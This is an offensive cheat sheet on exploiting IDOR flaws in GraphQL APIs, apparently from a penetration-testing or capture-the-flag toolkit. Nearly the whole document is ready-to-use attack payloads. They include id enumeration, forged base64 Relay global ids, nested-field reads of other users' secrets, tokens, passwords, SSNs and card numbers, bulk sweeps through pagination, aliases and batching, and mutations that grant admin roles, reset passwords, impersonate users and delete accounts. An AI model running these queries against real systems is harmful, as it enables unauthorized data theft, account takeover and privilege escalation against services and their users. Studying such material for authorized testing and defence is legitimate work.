# GraphQL IDOR — node(id), Relay globals, and the nested-object boundary

GraphQL compounds IDOR with the resolver-level authz problem — the query
reaches an object, but which resolver checks ownership?

---

## 1. The id arguments

```graphql
query { user(id: 42) { id email secret note } }
query { user(id: "42") { id email } }
query { user(id: "1") { id email } }
query { user(id: 0) { id email } }
query { user(id: -1) { id email } }
query { user(id: null) { id email } }
query { user(id: 42, includePrivate: true) { secret } }
query { user(id: 42) { admin } }
query { user(id: 42) { isAdmin } }
query { user(id: 42) { role } }
query { user(id: 42) { flag } }
```

`user(id:)` is the canonical IDOR arg. `id: 1` is usually admin.

## 2. The Relay global id

Relay/Apollo uses `node(id: "VXNlcjo0Mg==")` — the b64 `Type:id` global id:

```graphql
query { node(id: "VXNlcjo0Mg==") { ... on User { email secret } } }
query { node(id: "VXNlcjox") { ... on User { email } } }        # User:1
query { node(id: "T3JkZXI6MTAwMw==") { ... on Order { flag } } } # Order:1003
query { node(id: "RmlsZTo0Mg==") { ... on File { url } } }       # File:42
query { node(id: "Tm90ZTo0Mg==") { ... on Note { text } } }      # Note:42
query { node(id: "RG9jdW1lbnQ6NDI=") { ... on Document { body } } }
query { node(id: "UmVwb3J0OjQy") { ... on Report { data } } }
query { node(id: "SW52b2ljZTo0Mg==") { ... on Invoice { pdf } } }
query { node(id: "VGlja2V0OjQy") { ... on Ticket { content } } }
query { node(id: "TWVzc2FnZTo0Mg==") { ... on Message { body } } }
query { node(id: "Q29tbWVudDo0Mg==") { ... on Comment { text } } }
query { node(id: "UG9zdDo0Mg==") { ... on Post { content } } }
query { node(id: "Q29udGVudDo0Mg==") { ... on Content { body } } }
```

Decode the b64, change the int, re-encode:

```bash
echo 'VXNlcjo0Mg==' | base64 -d          # User:42
echo -n 'User:1' | base64                # VXNlcjox
echo -n 'Order:1' | base64               # T3JkZXI6MQ==
echo -n 'Admin:1' | base64
echo -n 'Flag:1' | base64
echo -n 'Secret:1' | base64
```

Try every Type prefix (`User`, `Order`, `File`, `Note`, `Document`,
`Report`, `Invoice`, `Ticket`, `Message`, `Post`, `Comment`, `Flag`,
`Secret`, `Admin`, `Config`, `Setting`, `Env`).

## 3. The nodes() bulk

```graphql
query { nodes(ids: ["VXNlcjox","VXNlcjoy","VXNlcjoz"]) { ... on User { email } } }
query { nodes(ids: ["VXNlcjox"]) { __typename } }   # enumerate types
query { nodes(ids: ["QWxhcm06MQ=="]) { ... } }
```

`nodes` lets you sweep many ids in one query — cheaper than one `node`.

## 4. The nested-object boundary

The query reaches an object through a parent — the parent may be yours
but the child another's:

```graphql
query { order(id: 1003) { user { email secret } } }     # user's private field via order
query { order(id: 1003) { owner { flag } } }
query { order(id: 1003) { customer { ssn } } }
query { order(id: 1003) { account { balance secret } } }
query { order(id: 1003) { items { product { flag } } } }
query { order(id: 1003) { invoice { file { url } } } }
query { order(id: 1003) { shipment { tracking { flag } } } }
query { order(id: 1003) { payment { card { number } } } }
query { order(id: 1003) { review { author { flag } } } }
query { user(id: 42) { orders { invoice { pdf } } } }
query { user(id: 42) { files { url } } }
query { user(id: 42) { notes { flag } } }
query { user(id: 42) { secrets { value } } }
query { user(id: 42) { tokens { value } } }
query { user(id: 42) { sessions { token } } }
query { user(id: 42) { apiKeys { key } } }
query { user(id: 42) { credentials { password } } }
query { user(id: 42) { flags { value } } }
query { user(id: 42) { flag } }
query { user(id: 42) { secret } }
query { user(id: 42) { note } }
query { user(id: 42) { bio } }
query { user(id: 42) { config { flag } } }
query { user(id: 42) { settings { flag } } }
query { user(id: 42) { env { flag } } }
query { user(id: 42) { admin { flag } } }
query { user(id: 42) { role { name permissions } } }
query { user(id: 42) { permissions { name } } }
query { user(id: 42) { groups { flag } } }
query { user(id: 42) { team { flag } } }
query { user(id: 42) { org { flag } } }
query { user(id: 42) { tenant { flag } } }
```

The authz is on `user(id:)` — once you reach the `user` object, the
nested `orders`/`files`/`notes`/`secrets`/`flag` field is a separate
resolver with a separate (often missing) check.

## 5. The connection/edge pattern

```graphql
query { user(id: 42) { orders(first: 10) { edges { node { invoice { pdf } } } } } }
query { user(id: 42) { files(first: 100) { edges { node { url } } } } }
query { user(id: 42) { notes { edges { node { flag } } } } }
query { users(first: 100) { edges { node { email flag } } } }
query { users { edges { node { secret } } } }
query { allUsers { edges { node { flag } } } }
query { users(last: 100) { edges { node { flag } } } }
query { users(offset: 0, limit: 1000) { edges { node { flag } } } }
query { users(page: 1, perPage: 1000) { edges { node { flag } } } }
query { users(filter: {role: "admin"}) { edges { node { flag } } } }
query { users(where: {role: {eq: "admin"}}) { edges { node { flag } } } }
query { users(search: "admin") { edges { node { flag } } } }
query { users(orderBy: "id") { edges { node { flag } } } }
query { users(sort: "id") { edges { node { flag } } } }
query { users { totalCount edges { node { flag } } } }
```

The `first:`/`last:`/`offset:`/`limit:`/`page:` pagination — a collection
that returns all users is a bulk IDOR.

## 6. The filter/where/search boundary

```graphql
query { users(filter: {id: 1}) { flag } }
query { users(filter: {role: "admin"}) { flag } }
query { users(filter: {email: "victim@t.tld"}) { flag } }
query { users(where: {id: {eq: 1}}) { flag } }
query { users(where: {role: {eq: "admin"}}) { flag } }
query { users(where: {owner: {eq: 1}}) { flag } }
query { orders(where: {user_id: {eq: 1}}) { flag } }
query { files(where: {owner: {eq: 1}}) { flag } }
query { notes(where: {author: {eq: 1}}) { flag } }
query { users(search: "admin") { flag } }
query { users(q: "admin") { flag } }
query { users(query: "admin") { flag } }
query { users(find: "admin") { flag } }
query { users(match: "admin") { flag } }
query { users(filter: {isAdmin: true}) { flag } }
query { users(filter: {admin: true}) { flag } }
query { users(filter: {is_admin: true}) { flag } }
query { users(filter: {role: {in: ["admin","root","system"]}}) { flag } }
query { users(filter: {id: {in: [1,2,3]}}) { flag } }
query { users(filter: {id: {gt: 0}}) { flag } }
query { users(filter: {id: {ne: 0}}) { flag } }
query { users(filter: {id: {exists: true}}) { flag } }
query { users(filter: {role: {exists: true}}) { flag } }
query { users(filter: {flag: {exists: true}}) { flag } }
query { users(filter: {secret: {exists: true}}) { flag } }
```

The `filter`/`where`/`search` argument scopes the collection — the
scope may accept a privileged filter.

## 7. The mutation-side IDOR

```graphql
mutation { updateUser(id: 42, role: "admin") { id } }
mutation { updateUser(id: 1, role: "admin") { id flag } }
mutation { updateUser(id: 42, isAdmin: true) { id } }
mutation { updateUser(id: 42, admin: true) { id } }
mutation { updateUser(id: 42, email: "you@t.tld") { id } }      # account change
mutation { updateUser(id: 42, password: "x") { id } }
mutation { deleteUser(id: 42) { id } }
mutation { removeUser(id: 42) { id } }
mutation { updateOrder(id: 1003, status: "shipped") { id } }
mutation { updateOrder(id: 1003, total: 0) { id } }
mutation { updateFile(id: 42, public: true) { id } }
mutation { updateNote(id: 42, owner: "you") { id } }
mutation { setRole(userId: 42, role: "admin") { id } }
mutation { assignRole(userId: 42, role: "admin") { id } }
mutation { grantRole(userId: 42, role: "admin") { id } }
mutation { promoteUser(id: 42) { id } }
mutation { impersonateUser(id: 42) { id token } }
mutation { switchUser(id: 42) { id token } }
mutation { becomeUser(id: 42) { id token } }
mutation { loginAs(id: 42) { token } }
mutation { readFlag(id: 1) { value } }
mutation { getFlag(id: 1) { value } }
mutation { flag(id: 1) { value } }
mutation { secret(id: 1) { value } }
mutation { admin(id: 1) { flag } }
mutation { exportUser(id: 1) { data } }
mutation { exportData(userId: 1) { data } }
mutation { downloadFile(id: 42) { url } }
mutation { shareFile(id: 42, public: true) { url } }
mutation { sendReset(userId: 1, email: "you@t.tld") { ok } }
mutation { resetPassword(userId: 1, password: "x") { ok } }
mutation { createApiKey(userId: 1) { key } }
mutation { createToken(userId: 1) { token } }
mutation { createSession(userId: 1) { token } }
```

Mutation args carry the same id — the resolver may check the mutation's
`input.user_id` against the session, or may not.

## 8. The alias/fragment trick

```graphql
query a { user(id:1){email} } query b { user(id:2){email} } query c { user(id:3){email} }
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }
query { admin:user(id:1){flag} root:user(id:0){flag} sys:user(id:-1){flag} }
```

Aliases let you sweep many ids in one query — cheaper than one request
per id.

## 9. The introspection-given id

Introspection may leak the id space:

```graphql
{ __schema { types { name fields { name } } } }
{ __type(name: "User") { fields { name } } }
{ user(id: 1) { __typename id } }
{ node(id: "VXNlcjox") { __typename } }
```

The `__typename` on a `node` tells you the Type for the gid prefix.

## 10. The subscription boundary

```graphql
subscription { orderUpdated(id: 1003) { flag } }
subscription { userUpdated(id: 42) { flag } }
subscription { messageAdded(roomId: "private-42") { body } }
subscription { fileChanged(id: 42) { flag } }
subscription { onOrder(orderId: 1003) { flag } }
subscription { flagChanged { value } }
subscription { adminEvent { flag } }
```

A subscription to another's events — the subscription authz is a
separate layer from the query.

## 11. The batching boundary

```graphql
[
  {"query":"{user(id:1){flag}}"},
  {"query":"{user(id:2){flag}}"},
  {"query":"{user(id:3){flag}}"}
]
```

Array-batched queries — each element is a separate query; the authz
may run once for the batch.

## 12. The persisted-query boundary

```
GET /graphql?queryId=getUser&variables={"id":42}
GET /graphql?extensions={"persistedQuery":{"sha256Hash":"..."}}
```

A persisted query with an editable `variables` — the query is fixed but
the id variable is yours.

## 13. The "the id is in the operationName" edge

Some routers dispatch on `operationName` — `{"operationName":"adminQuery"}`
vs `{"operationName":"userQuery","variables":{"id":42}}` — the op name
may route to a privileged resolver.

## 14. Evidence

Same as REST — a `confirms` needs another identity's attributable data
in the response. The GraphQL `data.user.email == victim@` is the marker.
`http_probe --evidence-regex '"email"\s*:\s*"victim@'` — verbatim.

See `web-graphql` for the resolver-level authz depth and the full
introspection/field-suggestion corpus.
